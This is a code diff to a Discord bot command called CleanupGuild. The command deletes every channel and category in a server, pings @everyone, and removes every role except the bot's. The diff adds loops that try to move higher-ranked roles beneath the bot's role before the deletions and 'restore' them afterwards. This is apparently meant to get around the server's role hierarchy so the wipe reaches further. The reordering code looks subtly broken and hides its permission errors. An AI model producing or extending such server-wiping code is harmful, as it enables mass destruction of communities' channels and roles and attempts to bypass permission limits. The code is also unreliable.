@@ -19,6 +19,17 @@ class CleanupGuild(commands.Cog):
         """
         guild = ctx.guild
 
+        # Get the bot's admin role (the top role)
+        bot_role = guild.get_member(self.bot.user.id).top_role
+
+        # Move the bot's role above all other roles
+        for role in guild.roles:
+            if role != bot_role and role.position > bot_role.position:
+                try:
+                    await role.edit(position=bot_role.position - 1, reason="CleanupGuild command")
+                except discord.errors.Forbidden:
+                    pass  # Bot does not have permission to move the role
+
         # Remove all channels and categories
         for channel in guild.channels:
             await channel.delete()
@@ -31,9 +42,6 @@ class CleanupGuild(commands.Cog):
 
         # Send a cleanup message in the new channel
         await channel.send("Server cleaned up @everyone")
-
-        # Get the bot's admin role (the top role)
-        bot_role = guild.get_member(self.bot.user.id).top_role
 
         # Delete all roles except the bot's admin role
         for role in guild.roles:
@@ -49,6 +57,14 @@ class CleanupGuild(commands.Cog):
                 await role.delete(reason="CleanupGuild command")
             except discord.errors.NotFound:
                 pass  # Role has already been deleted
+
+        # Restore the bot's role position
+        for role in guild.roles:
+            if role != bot_role and role.position > bot_role.position:
+                try:
+                    await role.edit(position=bot_role.position + 1, reason="CleanupGuild command")
+                except discord.errors.Forbidden:
+                    pass  # Bot does not have permission to move the role
 
 def setup(bot):
     bot.add_cog(CleanupGuild(bot))
